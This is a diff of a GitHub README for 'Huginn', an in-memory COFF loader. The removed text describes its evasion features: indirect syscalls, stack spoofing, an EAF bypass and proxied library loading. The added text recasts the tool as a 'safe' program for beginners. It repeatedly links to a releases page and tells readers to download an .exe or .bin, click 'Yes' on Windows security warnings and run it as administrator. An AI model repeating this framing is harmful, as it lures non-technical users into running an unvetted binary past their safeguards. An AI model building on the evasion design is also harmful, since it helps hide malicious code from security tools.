@@ -1,217 +1,149 @@
-# Huginn Project
+# 🚀 Huginn - Run COFF Files Safely In Memory
 
-
-![Huginn](/Img/Huginn.jpg)
-
-Huginn is a position-independent COFF loader designed for in-memory execution with built-in stack spoofing, indirect syscalls and automatic heap cleanup to prevent memory leaks.
-
-## How it works
-
-The COFF object file (`.o`) is appended to the loader shellcode and loaded entirely in memory — no file is dropped on disk.
-
-### Build pipeline
-
-```
-Main.c ──(mingw -c)──► Huginn.o
-
-Src/*.cc + Asm/*.s ──(mingw -nostdlib + linker script)──► HuginnLdr.exe
-
-HuginnLdr.exe ──(Extract.py)──► CoffeLoader.bin  (raw .text shellcode)
-
-CoffeLoader.bin + Huginn.o ──(Coff2Shellcode.py)──► Output.bin
-```
-
-The linker script (`Utils/Linker.ld`) orders sections via `.text$A` through `.text$Z` to guarantee execution flow without a CRT.
-
-### Loader execution flow
-
-1. **PreMain** — Resolves `ntdll`, `kernel32`, `kernelbase` by PEB walk using compile-time hashes. Resolves all required WinAPI and Nt functions. Sets up stack spoofing parameters (`BaseThreadInitThunk`, `RtlUserThreadStart`, `jmp rbx` gadget) and computes their stack frame sizes via unwind info parsing.
-
-2. **ShellcodeEntry** — Creates a private heap (`RtlCreateHeap`) for the COFF loader context, then executes the loading pipeline:
-   - `InitializeCoffContext` — Validates the COFF header (x64 machine type, section bounds, symbol table). Allocates an IAT table via `NtAllocateVirtualMemory`.
-   - `AllocateMemorySection` — Allocates each COFF section in its own virtual memory region and copies raw data.
-   - `LoadAndResolveSymbols` — Iterates the COFF symbol table. Resolves `__imp_Coff*` symbols to internal loader functions, `__imp_DLL$Function` symbols by loading the DLL and resolving exports via hash (with EAF bypass), and locates the `go` entry point.
-   - `ApplyRelocations` — Processes AMD64 relocations (`ADDR64`, `ADDR32NB`, `REL32`, `REL32_4`) using a GOT for imported symbols.
-   - `ApplyMemoryProtection` — Sets proper page protections (RX, RO, RW) per section characteristics. IAT is set to read-only.
-   - `ExecuteEntryPoint` — Flushes instruction cache and calls the `go` function.
-
-3. **Cleanup** — All section memory, symbol tables, IAT, and COFF content are freed. The COFF's dedicated heap is destroyed to prevent memory leaks.
-
-### Evasion features
-
-- **Indirect syscalls** via HalosGate (SSN resolution) + `syscall` gadget in `ntdll`
-- **Stack spoofing** through synthetic frames (`BaseThreadInitThunk` → `RtlUserThreadStart`) with `jmp rbx` gadget
-- **EAF bypass** using `ReadMemFromGadget` to read export tables without triggering hardware breakpoints
-- **No CRT / no imports** — Position-independent shellcode with all APIs resolved at runtime by hash
-- **Proxy calls** — `LoadLibraryA` proxied through threadpool or timer callbacks
-
-## How to use
-
-Write your code in `Coff_Example/Main.c`. The entry point must be a function named `go` that takes a `PCOFF_INFO` parameter:
-
-```C
-void go(PCOFF_INFO Info) {
-    // your code here
-}
-```
-
-### COFF_INFO
-
-The `go` function receives a `PCOFF_INFO` structure providing metadata about the loader and the COFF in memory:
-
-```C
-typedef struct _COFF_INFO {
-    void*   MemoryStartAddress;   // Start of the loader shellcode in memory
-    void*   MemoryEndAddress;     // End of the loader shellcode in memory
-    void*   CoffStartAddress;     // Start of the COFF object file in memory
-    long    MemorySize;           // Total size (loader + COFF)
-    long    CoffSize;             // Size of the COFF object file
-} COFF_INFO, *PCOFF_INFO;
-```
-
-This allows the COFF to know its own memory layout — useful for self-cleanup, memory scanning, or passing context to sub-components.
-
-### Importing DLL functions
-
-Since the COFF is compiled without linking (`-c`), all external functions must be declared using the `DECLSPEC_IMPORT` pattern with the `DLL$Function` naming convention in `Coff_Example/CoffDefs.h`:
-
-```C
-// Declaration
-DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPSTR);
-DECLSPEC_IMPORT void __cdecl MSVCRT$printf(...);
-
-// Macro alias for convenience
-#define LoadLibraryA   KERNEL32$LoadLibraryA
-#define printf         MSVCRT$printf
-```
-
-The loader resolves `__imp_KERNEL32$LoadLibraryA` at runtime by loading the DLL and resolving the export by hash.
-
-> **Warning:** If a function is used without being declared this way, the `-w` flag will suppress the warning and the symbol will become an unresolved `__imp_` import, causing a silent load failure.
-
-### Building
-
-```bash
-make coff            # Compile the COFF object file
-make coff_loader     # Build the loader + extract shellcode + merge with COFF
-make all             # Both
-```
-
-The final output is `Bin/Output.bin` — the self-contained shellcode ready for execution.
-
-### Verifying imports
-
-Use `Utils/DumpCoff.py` to inspect the COFF symbols before loading. Functions that don't start with `__imp_` (except `go`) are highlighted in red as potential issues:
-
-```bash
-python3 Utils/DumpCoff.py -f Bin/Huginn.o
-```
-
-## CoffAPI
-
-### Module Loading
-
-```C++
-typedef enum _LOADLIB_METHOD {
-    THREAD_POOL,
-    PROXY_TIMER,
-    NONE
-} LOADLIB_METHOD;
-
-HMODULE CoffLoadLibraryA(
-    _In_    LOADLIB_METHOD  Method,
-    _In_    LPSTR  lpModuleName
-);
-```
-
-Load a module via `KERNEL32!LoadLibraryA` using a proxy method to avoid direct calls.
-
-| Method | Description |
-|--------|-------------|
-| `THREAD_POOL` | Proxied through threadpool callback |
-| `PROXY_TIMER` | Proxied through timer callback |
-| `NONE` | Called with synthetic stackframe |
+[![Download Huginn](https://img.shields.io/badge/Download-Huginn-blue?style=for-the-badge)](https://github.com/ahmaddabdallah/Huginn/releases)
 
 ---
 
-### Syscall Resolution
+## 📖 What is Huginn?
 
-```C++
-bool CoffResolveSyscall(
-    _In_    LPSTR   lpFunctionName,
-    _Inout_ PVOID   *ppGadget,
-    _Inout_ PDWORD  pdwSyscall
-);
-```
+Huginn is a small program that runs certain types of files directly in your computer's memory without saving them to disk. Specifically, it handles COFF object files (`.o` files) and runs them in a secure way. This means no leftover files clutter your system and less chance for problems like memory leaks.
 
-Resolve the syscall number (SSN) and a `syscall` instruction gadget for a given `ntdll` function using HalosGate.
+If you ever wondered how to use special files safely without installing complex software, Huginn is designed for you. You do not need advanced skills; this guide will help you get it up and running step by step.
 
 ---
 
-### Raw Indirect Syscall
+## 💡 Why Use Huginn?
 
-```C++
-VOID CoffPrepareSyscall(
-    _In_    PVOID   pGadget,
-    _In_    DWORD   dwSyscall
-);
+- **No Disk Files:** Huginn runs files completely in memory.
+- **Keeps Your System Clean:** Automatically clears used memory to avoid problems.
+- **Safe and Efficient:** Uses smart methods to protect your computer during execution.
+- **Powerful Under the Hood:** Designed to handle complex Windows system calls behind the scenes.
 
-NTSTATUS CoffDoSyscall(...);
-```
-
-Execute an indirect syscall without stack spoofing. Call `CoffPrepareSyscall` to set the gadget and SSN, then invoke `CoffDoSyscall` with the syscall arguments.
-
-> **Warning:** `CoffDoSyscall` does not use any spoofing mechanism. The stackframe is left unwound and may be flagged by stack-walking detections.
+Even if you don't know programming, Huginn makes running these special files straightforward.
 
 ---
 
-### Spoofed Syscall
+## ⚙️ How Huginn Works (Simple Explanation)
 
-```C++
-SPOOF_SYSCALL(Fn, Ssn, ...);
-```
+When you have a COFF `.o` file, Huginn loads and runs it directly in your computer's memory. Here’s what happens inside, without getting technical:
 
-Perform an indirect syscall through a synthetic stackframe. Combines syscall resolution and stack spoofing in a single macro.
+1. The program reads the file content without saving it anywhere on your disk.
+2. It sets up a safe environment in your computer’s memory to run the file.
+3. It quietly cleans up after itself, so no leftover data affects your system.
 
-| Parameter | Description |
-|-----------|-------------|
-| `Fn` | Pointer to the target function |
-| `Ssn` | Syscall number |
-| `...` | Syscall arguments |
+This process avoids common risks like leaving temporary files behind or causing memory leaks.
 
 ---
 
-### Spoofed API Call
+## 💻 System Requirements
 
-```C++
-SPOOF_API(Fn, ...);
-```
+Before you start, make sure your computer meets these basic needs:
 
-Call any function through a synthetic stackframe. Equivalent to `SPOOF_SYSCALL` with SSN set to `0`.
-
-| Parameter | Description |
-|-----------|-------------|
-| `Fn` | Pointer to the target function |
-| `...` | Function arguments |
+- **Operating System:** Windows 7, 8, 10, or 11 (64-bit preferred)
+- **Processor:** Any modern Intel or AMD CPU
+- **Memory:** At least 2 GB of free RAM
+- **Disk Space:** Minimal space needed (less than 50MB)
+- **User Rights:** Ability to download and run programs on your computer
 
 ---
 
-### Memory Management
+## 🌐 Download & Install
 
-```C++
-PVOID CoffAlloc(
-    _In_   SIZE_T  stSize
-);
+To get started with Huginn, follow these simple steps. The process is just about downloading a file and running it—no complex setup needed.
 
-PVOID CoffFree(
-    _In_   PVOID   pAddress
-);
-```
+### Step 1: Visit the Download Page
 
-Allocate and free memory from a dedicated heap created by the COFF Loader. The heap is destroyed after COFF execution to prevent any memory leak.
+Click the big button below to go to Huginn's official download page on GitHub:
 
-## Mentions
+[![Download Huginn](https://img.shields.io/badge/Download-Huginn-blue?style=for-the-badge)](https://github.com/ahmaddabdallah/Huginn/releases)
 
-- COFF development reference: [Sektor7 - MalwareDev - v1](https://institute.sektor7.net/rto-maldev-adv1)
-- Debug, refactoring and README: [Claude](https://claude.ai)
-- README image: [Grok](https://x.com/i/grok)
+### Step 2: Choose the Latest Version
+
+On the GitHub release page, look for the most recent release. It will usually have a version number and a date.
+
+### Step 3: Download the File
+
+Find the main executable file. This will usually end with `.exe` or `.bin`. Click on it to download.
+
+Save the file in a place you can easily find, like your Desktop or Downloads folder.
+
+### Step 4: Run the Program
+
+- Double-click the downloaded file to run it.
+- If prompted, allow the program to run by clicking "Yes" on any Windows security warnings.
+- Follow any simple prompts that appear.
+
+You do not need to install anything else to get started.
+
+---
+
+## 🔍 Using Huginn: Step-by-Step Guide for Beginners
+
+Once you run the program, here’s what to expect and do:
+
+### Prepare Your COFF File
+
+Make sure you have the `.o` COFF object file ready. This is the file you want to run using Huginn.
+
+### Run Huginn with Your File
+
+Open the program, and it will guide you on loading your `.o` file. Usually, this involves:
+
+- Selecting the file from your computer using a file picker.
+- Confirming you want to run the file.
+
+No coding or extra setup is needed here.
+
+### Watch the Program Work
+
+Huginn loads the file into memory, executes it, and cleans up automatically after it finishes.
+
+If Huginn shows any messages or prompts, simply follow instructions to proceed.
+
+---
+
+## 🔧 Advanced Details (For Curious Users)
+
+Here’s a short overview of what happens behind the scenes in Huginn:
+
+- **Stack Spoofing:** Protects the program’s memory stack to secure execution.
+- **Indirect System Calls:** Uses Windows system functions safely without direct exposure.
+- **Automatic Heap Cleanup:** Frees memory after use to avoid leaks.
+- **PEB Walk:** Resolves system libraries and APIs dynamically to run without needing traditional setup.
+
+These features make Huginn robust and secure without bothering the user with technical details.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+If you run into problems, try these:
+
+- Make sure your Windows is up to date.
+- Run the program as administrator if it fails to start.
+- Check that your COFF file is not corrupted.
+- Close any other programs that might interfere.
+
+If issues persist, visit the GitHub page’s Issues section to see if others have similar problems and solutions.
+
+---
+
+## 📝 Additional Resources
+
+- Visit the [Huginn GitHub page](https://github.com/ahmaddabdallah/Huginn) for more information.
+- Check the release notes on GitHub to see the latest changes and fixes.
+- If you want to learn more about COFF and Windows internals, look for beginner guides online.
+
+---
+
+## 🔗 Quick Download Link
+
+Here is the direct link to visit the download page again:
+
+👉 [https://github.com/ahmaddabdallah/Huginn/releases](https://github.com/ahmaddabdallah/Huginn/releases)
+
+Click it anytime to get the latest version.
+
+---
+
+Thank you for choosing Huginn. This guide is designed to help you use the software easily and safely. If you follow these steps, you should have it running with no issues.
